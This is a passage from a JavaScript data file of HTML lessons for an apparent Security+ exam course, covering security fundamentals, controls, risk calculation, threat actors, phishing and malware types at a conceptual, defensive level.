<li><b>Controls:</b> redundancy (RAID, clustering, multiple regions), load balancing, backups following the 3-2-1 rule with an immutable/offline copy, DDoS protection, patching, capacity planning, UPS and generators, tested disaster recovery.</li>
<li><b>Example:</b> a DDoS attack against an online retailer on Black Friday.</li>
</ul>
<div class="callout tip"><b>The DAD triad</b> is the attacker's view: <b>D</b>isclosure (vs confidentiality), <b>A</b>lteration (vs integrity), <b>D</b>estruction/Denial (vs availability). Modern ransomware often hits all three: it steals data (disclosure, for extortion), encrypts it (denial) and may corrupt backups.</div>

<h3>Balancing the three</h3>
<p>The properties pull against each other. Encrypting everything with keys held by one person maximizes confidentiality but risks availability if they leave. Making data available everywhere increases exposure. Different systems weight them differently:</p>
<table>
<tr><th>System</th><th>Usually most important</th></tr>
<tr><td>Medical records</td><td>Confidentiality (privacy law) <i>and</i> availability (patient care)</td></tr>
<tr><td>Financial ledger</td><td>Integrity</td></tr>
<tr><td>Public website / e-commerce</td><td>Availability</td></tr>
<tr><td>Industrial control system (OT)</td><td>Availability and safety, then integrity — confidentiality last</td></tr>
</table>

<h3>AAA: authentication, authorization, accounting</h3>
<p>Access control in practice follows a sequence:</p>
<ol>
<li><b>Identification</b> — claiming an identity (typing a username, presenting a badge).</li>
<li><b>Authentication</b> — proving the claim (password, passkey, fingerprint, certificate).</li>
<li><b>Authorization</b> — deciding what the authenticated identity may do (permissions, roles, policies).</li>
<li><b>Accounting</b> (auditing) — recording what was done, by whom and when (logs).</li>
</ol>
<p>AAA applies to <b>systems</b> as well as people: a server authenticating to an API with a certificate or a workload identity token is also a subject. Protocols that implement AAA for network access include <b>RADIUS</b> (UDP 1812/1813, used for Wi-Fi 802.1X and VPNs) and <b>TACACS+</b> (TCP 49, common for network-device administration because it separates authorization per command and encrypts the whole payload).</p>
<div class="callout real"><b>On the job:</b> when triaging, map the evidence to AAA. "User authenticated successfully from a new country" (authentication), "then accessed a SharePoint site they have never used" (authorization worked as configured, but is the behavior normal?), "and the audit log shows 4,000 file downloads" (accounting gives you the evidence).</div>

<h3>Non-repudiation</h3>
<p><b>Non-repudiation</b> means someone cannot credibly deny an action they performed. It requires strong proof of identity tied to the action. A <b>digital signature</b> created with a private key that only the signer controls provides non-repudiation for a document or transaction; reliable audit logs tied to individual (not shared) accounts provide it for system actions. Shared admin accounts destroy non-repudiation — if five people know the "admin" password, you cannot prove which one deleted the database.</p>
<div class="callout warn">Symmetric message authentication codes (HMAC) prove integrity and that the sender knew the shared key, but they do <b>not</b> provide non-repudiation, because both parties hold the same key. Only asymmetric signatures do. This distinction is a favorite exam trick.</div>

<h3>Other foundational terms</h3>
<ul>
<li><b>Authenticity</b> — the data or party is genuine (who sent it).</li>
<li><b>Privacy</b> — appropriate handling of personal data; related to but broader than confidentiality.</li>
<li><b>Safety</b> — especially in OT/IoT, preventing physical harm is a security objective in itself.</li>
</ul>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 Domain 1.0 General Security Concepts, objective 1.2 "Summarize fundamental security concepts" — CIA, non-repudiation, AAA (authenticating people and systems, authorization models). Expect scenario questions such as "A company implements digital signatures on purchase orders. Which concept does this BEST provide?" (non-repudiation).</div>`,
  keyTerms: [
    ["Confidentiality", "Only authorized parties can access information"],
    ["Integrity", "Information is accurate and changed only in authorized ways"],
    ["Availability", "Systems and data are accessible when needed"],
    ["DAD triad", "Disclosure, Alteration, Destruction/Denial — the attacker's opposites of CIA"],
    ["Authentication", "Proving a claimed identity"],
    ["Authorization", "Determining what an authenticated subject may do"],
    ["Accounting", "Recording actions for audit and investigation"],
    ["Non-repudiation", "Assurance that a party cannot deny an action, e.g. via digital signature"],
    ["RADIUS / TACACS+", "AAA protocols for network access and device administration"]
  ],
  standards: ["NIST SP 800-12 Rev. 1", "FIPS 199"]
},
{
  id: "p1-m1-l2",
  module: "p1-m1",
  title: "Security Controls: Categories, Types and Defense in Depth",
  minutes: 18,
  objectives: [
    "Classify controls by category: technical, managerial, operational, physical",
    "Classify controls by type: preventive, deterrent, detective, corrective, compensating, directive",
    "Apply defense in depth to a realistic scenario",
    "Describe deception technologies such as honeypots and honeytokens"
  ],
  html: `<p>A <b>security control</b> is any safeguard that reduces risk. Security+ (and every auditor you will ever meet) expects you to describe controls along two independent axes: <i>what kind of thing it is</i> (category) and <i>what it does</i> (type). A single control has one category but may have more than one type.</p>

<h3>Control categories (what it is)</h3>
<table>
<tr><th>Category</th><th>Definition</th><th>Examples</th></tr>
<tr><td><b>Technical</b> (logical)</td><td>Implemented by technology</td><td>Firewalls, MFA, encryption, EDR, ACLs</td></tr>
<tr><td><b>Managerial</b> (administrative)</td><td>Policies, oversight and risk decisions</td><td>Security policy, risk assessments, vendor due diligence, hiring checks</td></tr>
<tr><td><b>Operational</b></td><td>Carried out by people day to day</td><td>Security awareness training, guards' patrols, change management procedures, log review</td></tr>
<tr><td><b>Physical</b></td><td>Tangible protections</td><td>Fences, locks, badge readers, bollards, CCTV, mantraps (access control vestibules)</td></tr>
</table>

<h3>Control types (what it does)</h3>
<table>
<tr><th>Type</th><th>Purpose</th><th>Examples</th></tr>
<tr><td><b>Preventive</b></td><td>Stops an incident from happening</td><td>Firewall deny rule, MFA, door lock, input validation</td></tr>
<tr><td><b>Deterrent</b></td><td>Discourages an attacker</td><td>Warning banner, visible cameras, "guard dog" signs, lighting</td></tr>
<tr><td><b>Detective</b></td><td>Identifies an incident in progress or after the fact</td><td>SIEM alerts, IDS, log review, motion sensors, file integrity monitoring</td></tr>
<tr><td><b>Corrective</b></td><td>Limits damage and restores normal state</td><td>Restoring from backup, EDR quarantining a file, patching after an exploit</td></tr>
<tr><td><b>Compensating</b></td><td>Alternative when the preferred control is not feasible</td><td>Isolating an unpatchable legacy system on its own VLAN with strict ACLs</td></tr>
<tr><td><b>Directive</b></td><td>Instructs people what to do</td><td>Acceptable use policy, "authorized personnel only" sign, procedures</td></tr>
</table>
<div class="callout tip">Some frameworks (including the CISSP CBK) also list <b>recovery</b> controls (backups, DR sites) separately from corrective controls. Security+ SY0-701 uses the six types above.</div>

<h4>Classifying on both axes</h4>
<table>
<tr><th>Control</th><th>Category</th><th>Type(s)</th></tr>
<tr><td>Security camera</td><td>Physical</td><td>Detective (records); deterrent (if visible)</td></tr>
<tr><td>Login banner warning of monitoring</td><td>Technical</td><td>Deterrent (and directive)</td></tr>
<tr><td>Annual phishing training</td><td>Operational</td><td>Preventive</td></tr>
<tr><td>Antivirus deleting malware</td><td>Technical</td><td>Corrective (and preventive when it blocks execution)</td></tr>
<tr><td>Data retention policy</td><td>Managerial</td><td>Directive</td></tr>
<tr><td>Quarterly access review</td><td>Managerial/Operational</td><td>Detective</td></tr>
</table>
<div class="callout exam"><b>Exam tip:</b> read the scenario for the control's <i>purpose in that context</i>. "A company posts signs stating that the premises are under video surveillance" → deterrent. "Footage is reviewed after a theft" → detective. Same cameras, different type. This is Security+ SY0-701 objective 1.1 "Compare and contrast various types of security controls".</div>

<h3>Defense in depth</h3>
<p>No single control is perfect, so we layer them. <b>Defense in depth</b> (also called layered security) means an attacker must defeat several independent controls, and each layer buys time for detection. Consider protecting a customer database:</p>
<ol>
<li><b>Policy</b> — data classification marks it as Confidential; only the billing team may access it (managerial, directive).</li>
<li><b>Perimeter</b> — the database is not internet-facing; a firewall allows only the app servers (technical, preventive).</li>
<li><b>Identity</b> — admins use phishing-resistant MFA and just-in-time access (technical, preventive).</li>
<li><b>Host</b> — hardened OS per CIS Benchmark, EDR agent (technical, preventive/detective/corrective).</li>
<li><b>Data</b> — encrypted at rest with keys in a KMS; sensitive columns tokenized (technical, preventive).</li>
<li><b>Monitoring</b> — database activity monitoring and SIEM alerts for bulk exports (technical, detective).</li>
<li><b>Recovery</b> — immutable backups tested quarterly (corrective).</li>
<li><b>People</b> — staff trained to spot phishing aimed at stealing admin credentials (operational, preventive).</li>
</ol>
<p>Good layering uses <b>diverse</b> controls: two firewalls from the same vendor with the same rule base are not much better than one. Combine technical, people and process controls, and prevention with detection and response — because prevention eventually fails.</p>

<h3>Deception and disruption</h3>
<p>Deception controls are detective controls with almost zero false positives: no legitimate user should ever touch them.</p>
<ul>
<li><b>Honeypot</b> — a decoy system that looks valuable (e.g. a fake file server).</li>
<li><b>Honeynet</b> — a network of honeypots.</li>
<li><b>Honeyfile</b> — a decoy document such as <code>passwords.xlsx</code> that alerts when opened.</li>
<li><b>Honeytoken</b> — fake credentials, API keys or database records planted where attackers look; any use triggers an alert. A fake AWS access key in a code repository is a classic example.</li>
</ul>
<div class="callout real"><b>On the job:</b> creating a dormant AD account with a juicy name (e.g. <code>svc_backup_admin</code>) and an SPN, and alerting on any Kerberos ticket request for it (Event 4769), is a cheap, high-fidelity Kerberoasting detector many SOCs deploy.</div>

<h3>Physical security belongs here too</h3>
<p>SY0-701 objective 1.2 includes physical controls: bollards (stop vehicles), access control vestibules (prevent tailgating), fencing, lighting, guards, video surveillance, access badges and sensors (infrared, pressure, microwave, ultrasonic). A perfect firewall does not help if someone can walk into the server room.</p>`,
  keyTerms: [
    ["Technical control", "Safeguard implemented through technology (firewall, MFA)"],
    ["Managerial control", "Policy, governance or risk-management safeguard"],
    ["Operational control", "Safeguard carried out by people, e.g. training or guard patrols"],
    ["Preventive control", "Stops an incident before it happens"],
    ["Detective control", "Identifies that an incident is occurring or occurred"],
    ["Corrective control", "Reduces impact and restores normal operations"],
    ["Compensating control", "Alternative safeguard when the primary control is not feasible"],
    ["Deterrent control", "Discourages attackers from attempting an attack"],
    ["Defense in depth", "Layering diverse, independent controls"],
    ["Honeytoken", "Decoy credential or data whose use triggers an alert"]
  ],
  standards: ["NIST SP 800-53 Rev. 5", "CIS Critical Security Controls v8.1"]
},
{
  id: "p1-m1-l3",
  module: "p1-m1",
  title: "Risk Basics, Gap Analysis and Change Management",
  minutes: 20,
  objectives: [
    "Define threat, vulnerability, risk, likelihood and impact",
    "Calculate SLE, ARO and ALE for a quantitative risk example",
    "Choose among risk responses: mitigate, transfer, avoid, accept",
    "Explain gap analysis and why change management is a security process"
  ],
  html: `<p>Security is not about eliminating all risk — that is impossible and would stop the business. It is about understanding risk well enough to make sensible, documented decisions. Even as a junior analyst you will be asked "how bad is this?" — and the answer is always a risk statement.</p>

<h3>The vocabulary</h3>
<table>
<tr><th>Term</th><th>Meaning</th><th>Example</th></tr>
<tr><td><b>Asset</b></td><td>Something of value</td><td>Customer database</td></tr>
<tr><td><b>Threat</b></td><td>Potential cause of harm (actor or event)</td><td>Ransomware gang; flood</td></tr>
<tr><td><b>Vulnerability</b></td><td>Weakness a threat can exploit</td><td>Unpatched VPN appliance</td></tr>
<tr><td><b>Exploit</b></td><td>Method or code that uses a vulnerability</td><td>Public proof-of-concept</td></tr>
<tr><td><b>Likelihood</b></td><td>Probability a threat exploits a vulnerability</td><td>High if exploited in the wild (CISA KEV)</td></tr>
<tr><td><b>Impact</b></td><td>Consequence if it happens</td><td>Data breach, outage, fines</td></tr>
<tr><td><b>Risk</b></td><td>Likelihood × impact</td><td>"High likelihood, high impact = critical risk"</td></tr>
</table>
<p>No vulnerability = no risk from that threat; no threat = no risk from that vulnerability. Controls reduce likelihood, impact or both. Whatever risk remains after controls is <b>residual risk</b>; the risk before controls is <b>inherent risk</b>.</p>

<h3>Qualitative vs quantitative assessment</h3>
<p><b>Qualitative</b> analysis uses ratings (Low/Medium/High) on a heat map — fast and common. <b>Quantitative</b> analysis assigns money values:</p>
<ul>
<li><b>AV</b> — asset value</li>
<li><b>EF</b> — exposure factor: the percentage of the asset lost in one incident</li>
<li><b>SLE</b> (single loss expectancy) = AV × EF</li>
<li><b>ARO</b> (annualized rate of occurrence) — how many times per year we expect it</li>
<li><b>ALE</b> (annualized loss expectancy) = SLE × ARO</li>
</ul>
<h4>Worked example</h4>
<pre><code>A file server and its data are valued at   AV  = $200,000
A ransomware incident would destroy 25%    EF  = 0.25
SLE = 200,000 x 0.25                           = $50,000
Expected once every two years              ARO = 0.5
ALE = 50,000 x 0.5                             = $25,000 per year

Proposed control: immutable backups + EDR costing $8,000/yr,
expected to cut ARO to 0.1 -&gt; new ALE = $5,000
Value of control = 25,000 - 5,000 - 8,000      = $12,000/yr  -&gt; worth it</code></pre>
<div class="callout tip">Rule of thumb for exams: a control is justified when its annual cost is less than the reduction in ALE it delivers. Spending $30,000 a year to prevent a $25,000 ALE is a bad deal.</div>

<h3>Risk responses</h3>
<table>
<tr><th>Response</th><th>What it means</th><th>Example</th></tr>
<tr><td><b>Mitigate</b> (reduce)</td><td>Apply controls</td><td>Patch, add MFA, segment</td></tr>
<tr><td><b>Transfer</b> (share)</td><td>Shift financial impact to a third party</td><td>Cyber insurance, outsourcing with contractual liability</td></tr>
<tr><td><b>Avoid</b></td><td>Stop the risky activity</td><td>Decommission the legacy app; don't store card numbers at all</td></tr>
<tr><td><b>Accept</b></td><td>Knowingly live with it, usually documented with an <b>exception</b> or <b>exemption</b> signed by the risk owner</td><td>Low-impact risk where controls cost more than the loss</td></tr>
</table>
<p>Risks are tracked in a <b>risk register</b> with an owner, rating, response and due date. <b>Risk appetite</b> is how much risk the organization is willing to pursue; <b>risk tolerance</b> is the acceptable variation around it. Analysts do not accept risk on the business's behalf — they surface it to the owner.</p>
<div class="callout warn">"Ignoring" a risk is not acceptance. Acceptance is a conscious, documented decision by someone with authority, ideally reviewed periodically.</div>

<h3>Gap analysis</h3>
<p>A <b>gap analysis</b> compares the current state of security to a desired state — usually a framework such as NIST CSF 2.0, ISO/IEC 27001:2022, the CIS Controls v8.1 or PCI DSS v4.0.1 — and lists the gaps with a remediation plan. Example: "CIS Control 6.5 requires MFA for administrative access; current state: MFA only on VPN, not on server consoles — gap; plan: enable MFA via PAM tool by Q2."</p>

<h3>Change management is a security control</h3>
<p>Unplanned changes cause outages (availability) and open holes (a "temporary" any-any firewall rule that never gets removed). Change management makes changes deliberate and reviewable. SY0-701 objective 1.3 lists the elements:</p>
<ul>
<li><b>Business processes:</b> approval process (often a Change Advisory Board), ownership, stakeholders, impact analysis, test results, backout plan, maintenance window, standard operating procedures.</li>
<li><b>Technical implications:</b> allow/deny lists, restricted activities, downtime, service and application restarts, legacy applications, dependencies.</li>
<li><b>Documentation and version control:</b> update diagrams, policies and procedures; track configuration versions.</li>
</ul>
<div class="callout real"><b>On the job:</b> change records are an investigation tool. An alert says "new admin account created on the payroll server at 22:10". Your first question: is there an approved change ticket? If yes, likely benign; if no, escalate. Mature SOCs integrate the change calendar with the SIEM for exactly this reason.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 1.2 (gap analysis), 1.3 "Explain the importance of change management processes and the impact to security", and 5.2 "Explain elements of the risk management process" (SLE, ALE, ARO, risk register, appetite, tolerance, responses). Expect at least one ALE calculation.</div>`,
  keyTerms: [
    ["Threat", "A potential cause of an unwanted incident"],
    ["Vulnerability", "A weakness that a threat can exploit"],
    ["Risk", "Combination of likelihood and impact of a threat exploiting a vulnerability"],
    ["SLE", "Single Loss Expectancy = Asset Value x Exposure Factor"],
    ["ARO", "Annualized Rate of Occurrence: expected incidents per year"],
    ["ALE", "Annualized Loss Expectancy = SLE x ARO"],
    ["Residual risk", "Risk remaining after controls are applied"],
    ["Risk register", "Record of identified risks, owners, ratings and responses"],
    ["Gap analysis", "Comparison of current state against a target framework or standard"],
    ["Backout plan", "Documented steps to reverse a change if it fails"]
  ],
  standards: ["NIST SP 800-30 Rev. 1", "NIST CSF 2.0", "ISO/IEC 27005:2022"]
}
);

// ===================== p1-m2 Threats, Vulnerabilities & Attacks =====================
CP.lessons.push(
{
  id: "p1-m2-l1",
  module: "p1-m2",
  title: "Threat Actors, Motivations and Attack Vectors",
  minutes: 18,
  objectives: [
    "Compare threat actor types by sophistication, resources and motivation",
    "Explain why shadow IT and insiders are threats",
    "List common threat vectors and describe the attack surface",
    "Relate supply-chain and third-party risk to real incidents"
  ],
  html: `<p>Defending well means knowing who is likely to attack you, why, and how they will try to get in. A regional credit union, a defense contractor and a gaming streamer face very different adversaries — and should prioritize differently.</p>

<h3>Threat actors</h3>
<table>
<tr><th>Actor</th><th>Resources / sophistication</th><th>Typical motivation</th><th>Notes</th></tr>
<tr><td><b>Nation-state</b> (APT)</td><td>Very high; zero-days, long campaigns</td><td>Espionage, political, war preparation, disruption</td><td>e.g. Volt Typhoon pre-positioning in U.S. critical infrastructure; Salt Typhoon in telecom networks (2024)</td></tr>
<tr><td><b>Organized crime</b></td><td>High; run like businesses</td><td>Financial gain</td><td>Ransomware-as-a-Service affiliates, initial access brokers, BEC groups</td></tr>
<tr><td><b>Hacktivist</b></td><td>Low to medium</td><td>Philosophical/political beliefs</td><td>DDoS, defacement, leaks</td></tr>
<tr><td><b>Insider threat</b></td><td>Varies; already has access</td><td>Revenge, financial gain, coercion — or simple negligence</td><td>Hard to detect; also includes fake remote IT workers placed by state actors</td></tr>
<tr><td><b>Unskilled attacker</b> ("script kiddie")</td><td>Low; uses others' tools</td><td>Notoriety, curiosity, disruption</td><td>Mass-scanning with public exploits</td></tr>
<tr><td><b>Shadow IT</b></td><td>N/A — internal</td><td>Convenience</td><td>Unapproved SaaS, personal cloud storage, unsanctioned AI tools holding company data</td></tr>
</table>
<p>Security+ also asks you to separate actors by <b>internal vs external</b> and by attributes: resources/funding and level of sophistication. Motivations listed in SY0-701 include data exfiltration, espionage, service disruption, blackmail, financial gain, philosophical/political beliefs, ethical (white-hat research), revenge, disruption/chaos and war.</p>
<div class="callout real"><b>On the job:</b> threat intelligence reports name actors with vendor-specific labels (Microsoft uses weather names such as "Midnight Blizzard", CrowdStrike uses animals such as "Cozy Bear", MITRE ATT&amp;CK uses group IDs like G0016 — all the same Russian SVR-linked group, also called APT29). Learn to cross-reference names; you will meet them in Phase 3.</div>

<h3>Threat vectors and the attack surface</h3>
<p>A <b>threat vector</b> is the path an attacker uses to reach a target. The <b>attack surface</b> is the sum of all such paths — every exposed service, user, device, API and supplier. Reducing it is one of the most effective security strategies.</p>
<table>
<tr><th>Vector (SY0-701 2.2)</th><th>Example</th></tr>
<tr><td>Message-based: email, SMS, instant messaging</td><td>Phishing email with a malicious link; QR code phishing</td></tr>
<tr><td>Image-based, file-based</td><td>Malicious PDF, macro-enabled document, ISO/LNK files</td></tr>
<tr><td>Voice call</td><td>Vishing "IT helpdesk" call asking for an MFA code</td></tr>
<tr><td>Removable device</td><td>USB drop attack</td></tr>
<tr><td>Vulnerable software / unsupported systems</td><td>Unpatched VPN or end-of-life Windows server</td></tr>
<tr><td>Unsecure networks: wireless, wired, Bluetooth</td><td>Evil-twin Wi-Fi in a café; open network ports in a lobby</td></tr>
<tr><td>Open service ports, default credentials</td><td>Internet-exposed RDP; camera with admin/admin</td></tr>
<tr><td>Supply chain: MSPs, vendors, suppliers</td><td>Compromised update or managed service provider</td></tr>
<tr><td>Human vectors / social engineering</td><td>Covered in the next lesson</td></tr>
</table>
<p>Client-based software (an installed agent) and agentless (a web portal) applications have different surfaces too: agents run code on your endpoints; agentless services push risk to identity and APIs.</p>

<h3>What the data says about initial access</h3>
<p>Industry breach reports (for example the Verizon DBIR and Mandiant M-Trends) have consistently shown that the leading ways in are <b>exploiting public-facing vulnerabilities</b> (especially edge devices like VPNs, firewalls and file-transfer appliances), <b>stolen or weak credentials</b>, and <b>phishing / social engineering</b>. Third-party involvement in breaches has grown sharply. That tells you where to focus: patch the edge fast, deploy phishing-resistant MFA, and watch your vendors.</p>

<h3>Supply-chain attacks</h3>
<ul>
<li><b>SolarWinds (2020)</b> — malicious code in a signed Orion update reached about 18,000 customers.</li>
<li><b>Kaseya VSA (2021)</b> — ransomware pushed through an MSP remote-management tool to downstream businesses.</li>
<li><b>MOVEit Transfer (2023)</b> — the Cl0p gang mass-exploited a SQL injection zero-day in a file-transfer product, stealing data from thousands of organizations.</li>
<li><b>XZ Utils (2024)</b> — a multi-year social-engineering campaign got a backdoor into a widely used open-source compression library; it was caught days before reaching mainstream Linux releases.</li>
</ul>
<div class="callout tip">Supply-chain defenses include vendor risk assessments, a <b>software bill of materials (SBOM)</b>, code signing and provenance (e.g. SLSA, Sigstore), least-privilege access for vendors and MSPs, and monitoring third-party connections like any other untrusted network.</div>
<div class="callout warn">Shadow IT now includes <b>shadow AI</b>: employees pasting source code or customer data into unapproved generative-AI tools. Treat it as a data-leakage vector and offer an approved alternative rather than only blocking.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 Domain 2.0 Threats, Vulnerabilities, and Mitigations — objective 2.1 "Compare and contrast common threat actors and motivations" and 2.2 "Explain common threat vectors and attack surfaces". Domain 2 is 22% of the exam.</div>`,
  keyTerms: [
    ["Threat actor", "Individual or group that poses a threat"],
    ["APT", "Advanced Persistent Threat: well-resourced, long-term, stealthy adversary, often state-backed"],
    ["Insider threat", "Risk from people with legitimate access, malicious or negligent"],
    ["Shadow IT", "Technology used without IT/security approval"],
    ["Threat vector", "Path or means by which an attacker reaches a target"],
    ["Attack surface", "All points where an attacker could try to enter or extract data"],
    ["Supply-chain attack", "Compromising a target via a trusted vendor, MSP or software dependency"],
    ["SBOM", "Software Bill of Materials listing components in software"],
    ["Initial access broker", "Criminal who sells access to compromised networks"]
  ],
  standards: ["MITRE ATT&CK TA0001", "NIST SP 800-161 Rev. 1"]
},
{
  id: "p1-m2-l2",
  module: "p1-m2",
  title: "Social Engineering and Phishing",
  minutes: 18,
  objectives: [
    "Describe phishing, spear phishing, whaling, vishing, smishing and quishing",
    "Explain BEC, pretexting, impersonation and watering-hole attacks",
    "Recognize MFA fatigue, help-desk social engineering and deepfake fraud",
    "Recommend layered defenses against social engineering"
  ],
  html: `<p>Attackers rarely need to break encryption when they can simply ask someone for the password. <b>Social engineering</b> manipulates people into taking actions or revealing information. It exploits principles of influence — <b>authority</b> ("This is the CEO"), <b>urgency</b> ("in the next 30 minutes"), <b>scarcity</b>, <b>social proof</b>, <b>familiarity/liking</b> and <b>intimidation</b>.</p>

<h3>The phishing family</h3>
<table>
<tr><th>Technique</th><th>Description</th></tr>
<tr><td><b>Phishing</b></td><td>Mass fraudulent email luring victims to click a link, open an attachment or enter credentials</td></tr>
<tr><td><b>Spear phishing</b></td><td>Targeted at a specific person or team using researched details</td></tr>
<tr><td><b>Whaling</b></td><td>Spear phishing aimed at executives</td></tr>
<tr><td><b>Vishing</b></td><td>Voice phishing by phone, often spoofing caller ID</td></tr>
<tr><td><b>Smishing</b></td><td>SMS/text phishing ("Your parcel is held — pay the fee")</td></tr>
<tr><td><b>Quishing</b></td><td>QR-code phishing; moves the victim to a phone outside corporate filtering</td></tr>
<tr><td><b>Typosquatting</b></td><td>Look-alike domains: <code>rnicrosoft.com</code>, <code>paypa1.com</code></td></tr>
<tr><td><b>Watering hole</b></td><td>Compromising a site the target group visits</td></tr>
<tr><td><b>Brand impersonation</b></td><td>Fake Microsoft 365, DocuSign or bank login pages</td></tr>
</table>

<h3>Business email compromise (BEC)</h3>
<p>BEC is consistently one of the costliest cybercrimes in FBI IC3 reporting — billions of dollars of reported losses per year — and it usually involves no malware at all. Variants: a "CEO" emails finance asking for an urgent wire; a compromised or spoofed supplier sends "updated bank details" for invoices; a payroll diversion request changes an employee's direct deposit. Attackers often compromise a real mailbox first and set <b>inbox rules</b> that hide replies — a key thing to check during investigation.</p>

<h3>Pretexting, impersonation and the help desk</h3>
<p><b>Pretexting</b> is building a believable story ("I'm from the audit team and need the vendor list"). <b>Impersonation</b> is pretending to be a specific person or role. The most damaging recent attacks combine them: groups such as Scattered Spider called IT help desks, impersonated employees using details found online, and convinced staff to reset passwords and enroll new MFA devices — leading to major breaches at casino and retail companies in 2023 and 2025.</p>

<h3>Attacks on MFA itself</h3>
<ul>
<li><b>MFA fatigue / push bombing</b> — flooding a user with push prompts until they approve one. Mitigation: number matching (now default in Microsoft Authenticator), rate limits, phishing-resistant MFA.</li>
<li><b>Adversary-in-the-middle (AiTM) phishing</b> — kits like Evilginx or Tycoon 2FA proxy the real login page, capturing the password <i>and</i> the session cookie after MFA. Only phishing-resistant authenticators (FIDO2 passkeys, certificate-based auth) defeat this, because they are bound to the real site's origin.</li>
<li><b>SIM swapping</b> — persuading a mobile carrier to move the victim's number, capturing SMS codes.</li>
</ul>

<h3>AI-enabled social engineering</h3>
<p>Generative AI has removed the bad grammar that used to give phishing away and enables <b>deepfake</b> voice and video. In a widely reported 2024 case, a finance employee in Hong Kong transferred about US$25 million after a video call in which every other "colleague", including the CFO, was a deepfake. Defenses must not depend on spotting fakes: use out-of-band verification through a known channel and require multi-person approval for payments.</p>

<h3>Other human vectors</h3>
<ul>
<li><b>Tailgating/piggybacking</b> — following someone through a secured door.</li>
<li><b>Shoulder surfing</b>, <b>dumpster diving</b>, <b>USB drops</b>.</li>
<li><b>Misinformation/disinformation</b> campaigns and <b>hoaxes</b> (fake security warnings).</li>
<li><b>Callback phishing</b> (TOAD — telephone-oriented attack delivery): an email says "call us to cancel this $499 subscription", and the call center walks the victim through installing remote-access software.</li>
</ul>

<h3>Indicators analysts check in a reported phish</h3>
<pre><code>From:        "Microsoft 365" &lt;no-reply@m365-secure-login.top&gt;
Reply-To:    payroll.dept.hr@gmail.com
Return-Path: bounce@mailer-xy.example
Authentication-Results: spf=fail; dkim=none; dmarc=fail
Subject:     ACTION REQUIRED: Password expires in 2 hours</code></pre>
<p>Mismatched display name and domain, a free-mail Reply-To, failed SPF/DKIM/DMARC, urgency, and a link whose real destination differs from its text are all red flags. You will analyze headers in depth in p2-m6.</p>

<h3>Defenses in layers</h3>
<ol>
<li><b>Technical:</b> email security gateway, SPF/DKIM/DMARC enforcement (<code>p=reject</code>), link rewriting/sandboxing, external-sender banners, blocking macros from the internet (default in Microsoft 365 since 2022), phishing-resistant MFA.</li>
<li><b>Process:</b> out-of-band verification for payment and bank-detail changes; help-desk identity verification (video verification, manager approval) before resets or MFA re-enrollment.</li>
<li><b>People:</b> continuous awareness training and simulations — and, crucially, an easy "Report phish" button and a no-blame culture so users report fast.</li>
</ol>
<div class="callout real"><b>On the job:</b> user-reported phishing is often a Tier 1 analyst's most common ticket. When one user reports, search mail logs for every recipient of the same message, check who clicked (proxy/DNS logs), purge the emails, block the sender and URL, and reset credentials for anyone who entered them — then revoke their sessions, because a reset alone does not kill a stolen session cookie.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 2.2 (human vectors/social engineering: phishing, vishing, smishing, misinformation, impersonation, BEC, pretexting, watering hole, brand impersonation, typosquatting) and 5.6 (security awareness practices, phishing campaigns, anomalous behavior recognition).</div>`,
  keyTerms: [
    ["Social engineering", "Manipulating people into revealing information or taking unsafe actions"],
    ["Spear phishing", "Targeted phishing using details about the victim"],
    ["Whaling", "Phishing aimed at senior executives"],
    ["Vishing / Smishing", "Phishing by voice call / by SMS"],
    ["BEC", "Business Email Compromise: fraud using spoofed or compromised business email"],
    ["Pretexting", "Using a fabricated scenario to gain trust"],
    ["MFA fatigue", "Bombarding a user with MFA push requests until one is approved"],
    ["AiTM phishing", "Proxy phishing that steals passwords and session cookies in real time"],
    ["Typosquatting", "Registering look-alike domains to deceive users"],
    ["Deepfake", "AI-generated synthetic audio or video impersonating a real person"]
  ],
  standards: ["MITRE ATT&CK T1566", "MITRE ATT&CK T1621", "RFC 7489 (DMARC)"]
},
{
  id: "p1-m2-l3",
  module: "p1-m2",
  title: "Malware Types and Indicators of Compromise",
  minutes: 18,
  objectives: [
    "Distinguish viruses, worms, trojans, ransomware, spyware, rootkits, logic bombs and bots",
    "Describe how modern ransomware operations work (RaaS, double extortion)",
    "Explain fileless malware and living-off-the-land techniques",
    "Recognize indicators of malicious activity on hosts and networks"
  ],
  html: `<p><b>Malware</b> is any software designed to harm, exploit or gain unauthorized control. Exams care about definitions; the job cares about behavior and indicators. This lesson gives you both.</p>

<h3>Malware by how it spreads and what it does</h3>
<table>
<tr><th>Type</th><th>Defining trait</th><th>Example</th></tr>
<tr><td><b>Virus</b></td><td>Attaches to a host file/program and needs user action to spread</td><td>Macro viruses in documents</td></tr>
<tr><td><b>Worm</b></td><td>Self-propagates across networks without user action</td><td>WannaCry (2017) via SMBv1 (EternalBlue)</td></tr>
<tr><td><b>Trojan</b></td><td>Disguised as legitimate software</td><td>Fake installer for a popular app delivered by malicious ads</td></tr>
<tr><td><b>RAT</b></td><td>Remote access trojan giving the attacker control</td><td>AsyncRAT, Remcos</td></tr>
<tr><td><b>Ransomware</b></td><td>Encrypts data and/or steals it for extortion</td><td>LockBit, Akira, Qilin and similar RaaS brands</td></tr>
<tr><td><b>Spyware / Keylogger</b></td><td>Monitors activity, captures keystrokes</td><td>Commercial spyware like Pegasus</td></tr>
<tr><td><b>Infostealer</b></td><td>Harvests saved passwords, browser cookies, crypto wallets</td><td>Lumma, RedLine — fuel for account takeover</td></tr>
<tr><td><b>Rootkit</b></td><td>Hides itself and other malware, often at kernel or firmware level</td><td>Bootkits such as BlackLotus</td></tr>
<tr><td><b>Logic bomb</b></td><td>Triggers on a condition or date</td><td>Disgruntled admin's script that wipes servers if their account is disabled</td></tr>
<tr><td><b>Bot / botnet</b></td><td>Infected devices controlled centrally (C2)</td><td>Mirai IoT botnets used for DDoS</td></tr>
<tr><td><b>Bloatware / PUP</b></td><td>Unwanted pre-installed or bundled software</td><td>Adds attack surface</td></tr>
</table>

<h3>Modern ransomware: a business model</h3>
<p>Ransomware today is usually <b>Ransomware-as-a-Service (RaaS)</b>: developers rent their encryptor and leak site to <b>affiliates</b> who break in, often using access bought from <b>initial access brokers</b>. A typical intrusion:</p>
<ol>
<li>Initial access — exploited VPN/edge device, stolen credentials, phishing, or an infostealer log.</li>
<li>Discovery and credential theft — AD enumeration, dumping LSASS, Kerberoasting.</li>
